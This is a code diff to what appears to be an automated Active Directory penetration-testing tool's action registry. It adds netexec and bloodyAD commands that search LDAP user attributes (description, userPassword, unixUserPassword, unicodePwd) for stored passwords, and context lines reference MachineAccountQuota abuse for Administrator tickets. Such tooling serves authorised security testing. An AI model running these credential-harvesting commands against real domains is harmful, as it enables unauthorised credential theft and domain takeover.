@@ -324,6 +324,18 @@ ACTION_REGISTRY: dict[str, Action] = {
              "(MachineAccountQuota abuse). Yields a service ticket as Administrator to the target."),
     "ldapsearch_anon": _a("ldapsearch_anon",
         ["ldapsearch -x -H ldap://$IP -s base namingcontexts"], outputs="raw"),
+    "netexec_get_desc_users": _a("netexec_get_desc_users",
+        ["nxc ldap $IP -u <USER> -p '<PASS>' -M get-desc-users",
+         "nxc ldap $IP -u <USER> -p '<PASS>' -M get-unixUserPassword -M getUserPassword"],
+        runnable=False, outputs="raw",
+        note="Admins park passwords in the AD user description / userPassword / unixUserPassword / "
+             "unicodePwd fields. Enumerate them with a valid domain cred."),
+    "bloodyad_password_fields": _a("bloodyad_password_fields",
+        ["bloodyAD -u <USER> -p '<PASS>' -d $DOMAIN --host $IP get search "
+         "--filter '(|(userPassword=*)(unixUserPassword=*)(unicodePwd=*)(description=*))' "
+         "--attr userPassword,unixUserPassword,unicodePwd,description"],
+        runnable=False, outputs="raw",
+        note="bloodyAD LDAP search across the four common password-bearing attributes."),
 
     # --- AD attack (chained off enumeration findings; see playbooks/ad.yaml) ---
     "ldap_anon_dump": _a("ldap_anon_dump",
